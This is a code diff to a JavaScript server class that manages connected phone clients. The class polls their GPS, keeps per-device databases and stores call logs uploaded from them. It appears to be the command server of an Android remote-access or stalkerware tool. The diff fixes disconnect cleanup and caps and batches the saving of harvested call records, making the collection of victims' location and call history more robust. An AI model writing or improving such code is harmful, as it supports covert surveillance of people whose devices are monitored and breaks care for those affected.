@@ -54,19 +54,22 @@ class Clients {
     clientDisconnect(clientID) {
         console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);
 
-        if (this.ignoreDisconnects[clientID]) {
-            delete this.ignoreDisconnects[clientID];
-        } else {
-            logManager.log(CONST.logTypes.info, clientID + " Disconnected")
-            this.db.maindb.get('clients').find({ clientID }).assign({
-                lastSeen: new Date(),
-                isOnline: false,
-            }).write()
-            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
-            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
-            if (this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
+        const shouldIgnore = this.ignoreDisconnects[clientID];
+        if (shouldIgnore) {
             delete this.ignoreDisconnects[clientID];
         }
+
+        logManager.log(CONST.logTypes.info, clientID + " Disconnected")
+        this.db.maindb.get('clients').find({ clientID }).assign({
+            lastSeen: new Date(),
+            isOnline: false,
+        }).write()
+        
+        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
+        if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
+        
+        // Only delete the DB handle if we are NOT ignoring (a real disconnect/cleanup)
+        if (!shouldIgnore && this.clientDatabases[clientID]) delete this.clientDatabases[clientID];
     }
 
     getClientDatabase(clientID) {
@@ -206,19 +209,20 @@ class Clients {
         socket.on(CONST.messageKeys.call, (data) => {
             if (data.callsList && Array.isArray(data.callsList)) {
                 if (data.callsList.length !== 0) {
-                    let callsList = data.callsList;
+                    let callsList = data.callsList.slice(0, 1000); // Cap updates
                     let dbCall = client.get('CallData');
                     let newCount = 0;
                     callsList.forEach(call => {
                         if (!call.phoneNo || !call.date) return;
-                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
+                        let hash = crypto.createHash('md5').update(String(call.phoneNo) + String(call.date)).digest("hex");
                         if (dbCall.find({ hash }).value() === undefined) {
                             // cool, we dont have this call
                             call.hash = hash;
-                            dbCall.push(call).write();
+                            dbCall.push(call);
                             newCount++;
                         }
                     });
+                    if (newCount > 0) dbCall.write(); // Batch write
                     logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                 }
             }
